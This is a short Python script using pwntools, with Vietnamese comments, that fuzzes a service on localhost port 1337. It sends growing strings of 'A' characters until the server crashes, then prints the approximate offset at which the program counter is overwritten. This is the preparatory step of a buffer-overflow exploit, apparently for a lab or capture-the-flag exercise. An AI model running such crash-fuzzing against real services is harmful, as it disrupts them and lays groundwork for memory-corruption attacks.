from pwn import *
import time
# context.log_level = 'warn'
offset = 1
while offset < 500:
    try:
        # Chỉ gửi chuỗi 'A' và một dấu xuống dòng
        payload = b'A' * offset + b'\r\n'

        # Kết nối, gửi, và đóng
        r = remote("127.0.0.1", 1337, timeout=1)
        r.send(payload)
        r.close()

        print(f"[*] Testing offset {offset}: SERVER ALIVE")
        offset += 1
        time.sleep(0.1) # Nghỉ một chút để server kịp khởi động lại

    except (EOFError, PwnlibException):
        # EOFError hoặc Timeout có nghĩa là server đã crash!
        print(f"\n[+] BINGO! SERVER CRASHED at offset ~{offset}!\n")
        print(f"The exact offset to overwrite PC is between {offset-20} and {offset+20}.")
        break